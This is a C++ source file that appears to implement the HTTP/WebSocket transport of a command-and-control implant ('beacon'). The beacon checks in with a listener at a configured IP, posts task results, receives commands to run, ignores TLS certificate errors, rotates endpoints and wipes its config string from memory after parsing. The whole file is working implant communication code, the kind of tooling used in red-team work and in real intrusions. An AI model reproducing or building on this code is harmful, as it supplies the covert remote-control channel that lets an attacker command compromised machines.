#include "BeaconHttp.hpp"

#include <ctime>
#include <random>

#ifdef __linux__

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"

#elif _WIN32

#include <bcrypt.h>
#include <wincrypt.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")

#endif

using namespace std;

#ifdef _WIN32

std::wstring getUtf16(const std::string& str, int codepage)
{
    if (str.empty()) 
        return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}


bool HttpsWebRequestPost(const string& domain,
                         int port,
                         const string& url,
                         const string& data,
                         const nlohmann::json& httpHeaders,
                         bool isHttps,
                         string& response)
{
    response.clear();

    wstring sdomain = getUtf16(domain, CP_UTF8);
    wstring surl = getUtf16(url, CP_UTF8);

    DWORD dwSize = 0;

    LPSTR pszOutBuffer = nullptr;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, sdomain.c_str(), port, 0);

    // Create an HTTP request handle.
    DWORD dwFlags = 0;
    if(isHttps)
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"POST", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);

    // Add a request header.
    if( hRequest )
    {
        for (auto& it : httpHeaders.items())
        {
            std::string newHeader = (it).key();
            newHeader+=":";
            newHeader+=it.value().get<std::string>();

            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());

            bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
        }
    }

    if(isHttps)
    {
        // if https & self sign certificat
        dwFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    // // Debug proxy configuration
    // // https://stackoverflow.com/questions/35082021/code-to-send-an-http-request-through-a-proxy-using-winhttp
    // // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
    // WINHTTP_PROXY_INFO proxy = { 0 };
    // proxy.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    // proxy.lpszProxy = L"http://127.0.0.1:8080";
    // WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxy, sizeof(proxy));

    // Post data
    LPSTR pdata = const_cast<char*>(data.c_str());;
    DWORD lenData = data.size();

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pdata, lenData, lenData, 0);

    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwStatusCode = 0;
    if (bResults && hRequest)
    {
        dwSize = sizeof(dwStatusCode);
        WinHttpQueryHeaders(hRequest,
                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX,
                            &dwStatusCode,
                            &dwSize,
                            WINHTTP_NO_HEADER_INDEX);
    }


    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                // printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                {
                    // printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {
                    // printf("%s", pszOutBuffer);
                    response += string(pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    // Report any errors.
    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) 
        WinHttpCloseHandle(hRequest);
    if (hConnect) 
        WinHttpCloseHandle(hConnect);
    if (hSession) 
        WinHttpCloseHandle(hSession);

    return bResults && dwStatusCode == 200;
}


std::string GenerateSecWebSocketKey()
{
    BYTE rnd[16];
    BCryptGenRandom(NULL, rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // base64 encode
    DWORD size = 0;
    CryptBinaryToStringA(rnd, sizeof(rnd), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size);
    std::string key(size, 0);
    CryptBinaryToStringA(rnd, sizeof(rnd), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, key.data(), &size);

    return key;
}


void LogLastError(const char* msg)
{
    DWORD err = GetLastError();
    //std::cout << msg << " FAILED. LastError = " << err << std::endl;
}


// Returns true if a complete message was received into replyText/replyBin.
// isBinary tells you which one is valid.
bool ReceiveFullWsMessage(
    HINTERNET hWebSocket,
    std::string& replyText,
    std::vector<BYTE>& replyBin,
    bool& isBinary
)
{
    replyText.clear();
    replyBin.clear();
    isBinary = false;

    std::vector<BYTE> buffer(4096);

    DWORD bytesRead = 0;
    WINHTTP_WEB_SOCKET_BUFFER_TYPE type = WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE;

    bool started = false;
    bool binary = false;

    for (;;)
    {
        bytesRead = 0;
        type = WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE;

        DWORD recvRes = WinHttpWebSocketReceive(
            hWebSocket,
            buffer.data(),
            static_cast<DWORD>(buffer.size()),
            &bytesRead,
            &type
        );

        if (recvRes != NO_ERROR)
        {
            //std::cout << "[WS] Receive error = " << recvRes << std::endl;
            return false;
        }

        // Handle CLOSE
        if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE)
        {
            USHORT status = 0;
            std::vector<BYTE> reason(256);
            DWORD reasonLen = 0;

            DWORD st = WinHttpWebSocketQueryCloseStatus(
                hWebSocket,
                &status,
                reason.data(),
                static_cast<DWORD>(reason.size()),
                &reasonLen
            );

            std::string reasonStr;
            if (st == NO_ERROR && reasonLen > 0)
                reasonStr.assign(reinterpret_cast<char*>(reason.data()), reasonLen);

            //std::cout << "[WS] Close received. status=" << status
                    //   << " reason=" << reasonStr << std::endl;
            return false;
        }

        // Determine message kind on the first frame
        if (!started)
        {
            started = true;
            if (type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE ||
                type == WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE)
            {
                binary = false;
            }
            else if (type == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE ||
                     type == WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE)
            {
                binary = true;
            }
            else
            {
                //std::cout << "[WS] Unexpected buffer type: " << type << std::endl;
                return false;
            }
        }

        // Accumulate payload (bytesRead may be 0 on some frames)
        if (bytesRead > 0)
        {
            if (binary)
                replyBin.insert(replyBin.end(), buffer.begin(), buffer.begin() + bytesRead);
            else
                replyText.append(reinterpret_cast<const char*>(buffer.data()), bytesRead);
        }

        // Done when we get a *MESSAGE* buffer type (not FRAGMENT)
        if (!binary && type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE)
            break;
        if (binary && type == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE)
            break;

        // Otherwise we received a fragment; continue reading
    }

    isBinary = binary;
    return true;
}


static void WsDisconnect(WsClient& c)
{
    if (c.hWebSocket)
    {
        // Best-effort close; ignore failures here.
        WinHttpWebSocketClose(c.hWebSocket,
                              WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
                              NULL, 0);
        WinHttpCloseHandle(c.hWebSocket);
        c.hWebSocket = nullptr;
    }

    if (c.hConnect)
    {
        WinHttpCloseHandle(c.hConnect);
        c.hConnect = nullptr;
    }

    if (c.hSession)
    {
        WinHttpCloseHandle(c.hSession);
        c.hSession = nullptr;
    }
}


static bool WsConnectOnce(WsClient& c)
{
    WsDisconnect(c); // ensure clean state before connecting

    //std::cout << "[WS] Host=" << std::string(c.host.begin(), c.host.end())
            //   << " Path=" << std::string(c.path.begin(), c.path.end())
            //   << " Port=" << c.port
            //   << " HTTPS=" << c.isHttps
            //   << std::endl;

    const DWORD requestFlags = c.isHttps ? WINHTTP_FLAG_SECURE : 0;

    // SESSION
    c.hSession = WinHttpOpen(L"Beacon/1.0",
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME,
                             WINHTTP_NO_PROXY_BYPASS,
                             0);
    if (!c.hSession)
    {
        LogLastError("[WS] WinHttpOpen");
        WsDisconnect(c);
        return false;
    }

    // CONNECT
    //std::cout << "[WS] WinHttpConnect...\n";
    c.hConnect = WinHttpConnect(c.hSession, c.host.c_str(), (INTERNET_PORT)c.port, 0);
    if (!c.hConnect)
    {
        LogLastError("[WS] WinHttpConnect");
        WsDisconnect(c);
        return false;
    }

    // REQUEST (temporary handle; closed after upgrade)
    //std::cout << "[WS] WinHttpOpenRequest to "
            //   << std::string(c.path.begin(), c.path.end()) << "\n";

    HINTERNET hRequest = WinHttpOpenRequest(
        c.hConnect,
        L"GET",
        c.path.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        requestFlags
    );

    if (!hRequest)
    {
        LogLastError("[WS] WinHttpOpenRequest");
        WsDisconnect(c);
        return false;
    }

    // WebSocket upgrade option
    //std::cout << "[WS] Setting WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET...\n";
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0))
    {
        LogLastError("[WS] WinHttpSetOption(UPGRADE)");
        WinHttpCloseHandle(hRequest);
        WsDisconnect(c);
        return false;
    }

    // Headers
    //std::cout << "[WS] Adding WebSocket headers...\n";
    const std::wstring wsKey = getUtf16(GenerateSecWebSocketKey(), CP_UTF8);
    std::wstring headers =
        L"Connection: Upgrade\r\n"
        L"Upgrade: websocket\r\n"
        L"Sec-WebSocket-Version: 13\r\n"
        L"Sec-WebSocket-Key: " + wsKey + L"\r\n";

    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD))
    {
        LogLastError("[WS] WinHttpAddRequestHeaders");
        WinHttpCloseHandle(hRequest);
        WsDisconnect(c);
        return false;
    }

    // TLS relax (optional)
    if (c.isHttps && c.allowInsecureTls)
    {
        DWORD secFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    // SEND REQUEST
    //std::cout << "[WS] Sending request...\n";
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, NULL))
    {
        LogLastError("[WS] WinHttpSendRequest");
        WinHttpCloseHandle(hRequest);
        WsDisconnect(c);
        return false;
    }

    // RECEIVE RESPONSE
    //std::cout << "[WS] Receiving response...\n";
    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        LogLastError("[WS] WinHttpReceiveResponse");
        WinHttpCloseHandle(hRequest);
        WsDisconnect(c);
        return false;
    }

    // CHECK STATUS CODE
    DWORD status = 0;
    DWORD size   = sizeof(status);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        &status, &size, WINHTTP_NO_HEADER_INDEX);

    //std::cout << "[WS] HTTP Status = " << status << "\n";
    if (status != 101)
    {
        //std::cout << "[WS] ERROR: Expected 101 Switching Protocols\n";
        WinHttpCloseHandle(hRequest);
        WsDisconnect(c);
        return false;
    }

    // COMPLETE UPGRADE
    //std::cout << "[WS] Completing WebSocket upgrade...\n";
    c.hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, NULL);
    WinHttpCloseHandle(hRequest); // safe after upgrade

    if (!c.hWebSocket)
    {
        LogLastError("[WS] WinHttpWebSocketCompleteUpgrade");
        WsDisconnect(c);
        return false;
    }

    //std::cout << "[WS] Upgrade OK (hWebSocket=" << c.hWebSocket << ")\n";
    return true;
}


static bool WsConnectWithRetry(WsClient& c, int maxAttempts = 5, int baseDelayMs = 250)
{
    for (int attempt = 1; attempt <= maxAttempts; ++attempt)
    {
        if (WsConnectOnce(c))
            return true;

        if (attempt == maxAttempts)
            break;

        // simple exponential backoff (cap it)
        int delay = baseDelayMs * (1 << (attempt - 1));
        if (delay > 5000) delay = 5000;

        //std::cout << "[WS] Connect failed; retry " << (attempt + 1)
                //   << "/" << maxAttempts << " in " << delay << "ms\n";
        Sleep((DWORD)delay);
    }

    return false;
}


static bool WsCommunicate(WsClient& c,
                          const std::string& message,
                          std::string& replyText,
                          std::vector<BYTE>* replyBinOut = nullptr,
                          bool* isBinaryOut = nullptr)
{
    if (!c.hWebSocket)
    {
        //std::cout << "[WS] ERROR: communicate called with no active websocket\n";
        return false;
    }

    // SEND MESSAGE
    //std::cout << "[WS] Sending WS message: " << message << "\n";
    if (WinHttpWebSocketSend(c.hWebSocket,
                             WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                             (BYTE*)message.data(),
                             (DWORD)message.size()) != 0)
    {
        LogLastError("[WS] WinHttpWebSocketSend");
        return false;
    }

    // RECEIVE FULL MESSAGE (your helper)
    std::vector<BYTE> replyBin;
    bool isBinary = false;

    if (!ReceiveFullWsMessage(c.hWebSocket, replyText, replyBin, isBinary))
        return false;

    // if (isBinary)
    //     //std::cout << "[WS] Got binary message, size=" << replyBin.size() << "\n";
    // else
    //     //std::cout << "[WS] Got text message, size=" << replyText.size() << "\n";

    if (replyBinOut)  *replyBinOut  = std::move(replyBin);
    if (isBinaryOut)  *isBinaryOut  = isBinary;

    return true;
}

#endif


BeaconHttp::BeaconHttp(std::string& config, std::string& ip, int port, bool isHttps)
    : Beacon()
    , m_isHttps(isHttps)
{
    srand(time(NULL));

    m_ip = ip;
    m_port = port;

    nlohmann::json configJson = nlohmann::json::parse(config);
    if(isHttps)
        m_beaconHttpConfig = configJson["ListenerHttpsConfig"];
    else
        m_beaconHttpConfig = configJson["ListenerHttpConfig"];

    initConfig(config);

    for(int i=0; i<config.size(); i++)
        config[i]='.';
}

BeaconHttp::~BeaconHttp()
{
    resetWebSocketConnection();
}

std::string BeaconHttp::pickRandomEndpoint(const char* key) const
{
    auto it = m_beaconHttpConfig.find(key);
    if (it == m_beaconHttpConfig.end() || !it->is_array() || it->empty())
        return {};

    return (*it)[rand() % it->size()].get<std::string>();
}

void BeaconHttp::resetWebSocketConnection()
{
#ifdef __linux__
    if (m_wsClient)
    {
        if (m_wsClient->is_open())
            m_wsClient->close();
        m_wsClient.reset();
    }
#elif _WIN32
    WsDisconnect(m_ws);
#endif

    m_wsEndpoint.clear();
}

bool BeaconHttp::ensureWebSocketConnected()
{
    const std::string endpoint = m_wsEndpoint.empty() ? pickRandomEndpoint("wsUri") : m_wsEndpoint;
    if (endpoint.empty())
        return false;

#ifdef __linux__
    if (m_wsClient && m_wsClient->is_open())
        return true;

    if (m_wsClient)
        m_wsClient.reset();

    auto ws = std::make_unique<httplib::ws::WebSocketClient>(
        (m_isHttps ? "wss://" : "ws://") + m_ip + ":" + std::to_string(m_port) + endpoint);
    if (!ws->is_valid())
        return false;

    ws->set_connection_timeout(5, 0);
    ws->set_read_timeout(5, 0);
    ws->set_write_timeout(5, 0);
    ws->set_websocket_ping_interval(30);
#ifdef CPPHTTPLIB_SSL_ENABLED
    if (m_isHttps)
        ws->enable_server_certificate_verification(false);
#endif

    if (!ws->connect())
        return false;

    m_wsClient = std::move(ws);

#elif _WIN32
    if (m_ws.hWebSocket)
        return true;

    m_ws.host = getUtf16(m_ip, CP_UTF8);
    m_ws.port = m_port;
    m_ws.path = getUtf16(endpoint, CP_UTF8);
    m_ws.isHttps = m_isHttps;
    m_ws.allowInsecureTls = true;

    if (!WsConnectWithRetry(m_ws, 5, 250))
        return false;
#endif

    m_wsEndpoint = endpoint;
    return true;
}

bool BeaconHttp::tryWebSocketCheckIn(const std::string& output, std::string& input)
{
    for (int attempt = 0; attempt < 2; ++attempt)
    {
        if (!ensureWebSocketConnected())
            return false;

#ifdef __linux__
        if (!m_wsClient || !m_wsClient->send(output))
        {
            resetWebSocketConnection();
            continue;
        }

        std::string message;
        const auto result = m_wsClient->read(message);
        if (result == httplib::ws::Fail)
        {
            resetWebSocketConnection();
            continue;
        }

        input = std::move(message);
        return true;

#elif _WIN32
        if (WsCommunicate(m_ws, output, input))
            return true;

        resetWebSocketConnection();
#endif
    }

    return false;
}

bool BeaconHttp::tryHttpCheckIn(const std::string& output, std::string& input)
{
    const std::string endPoint = pickRandomEndpoint("uri");
    if (endPoint.empty())
        return false;

    nlohmann::json httpHeaders = nlohmann::json::object();
    auto itClient = m_beaconHttpConfig.find("client");
    if (itClient != m_beaconHttpConfig.end() && itClient->is_object())
    {
        auto itHeaders = itClient->find("headers");
        if (itHeaders != itClient->end() && itHeaders->is_object())
            httpHeaders = *itHeaders;
    }

#ifdef __linux__
    httplib::Headers httpClientHeaders;
    for (auto& it : httpHeaders.items())
        httpClientHeaders.insert({it.key(), it.value().get<std::string>()});

    if(m_isHttps)
    {
        httplib::SSLClient cli(m_ip, m_port);
        cli.enable_server_certificate_verification(false);

        if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
        {
            if (res->status == 200)
            {
                input = res->body;
                return true;
            }
        }
    }
    else
    {
        httplib::Client cli(m_ip, m_port);

        if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
        {
            if (res->status == 200)
            {
                input = res->body;
                return true;
            }
        }
    }

#elif _WIN32

    return HttpsWebRequestPost(m_ip, m_port, endPoint, output, httpHeaders, m_isHttps, input);

#endif

    return false;
}

void BeaconHttp::checkIn()
{
    std::string output;
    taskResultsToCmd(output);

    std::string input;
    if (!tryWebSocketCheckIn(output, input))
        tryHttpCheckIn(output, input);

    if (!input.empty())
        cmdToTasks(input);
}
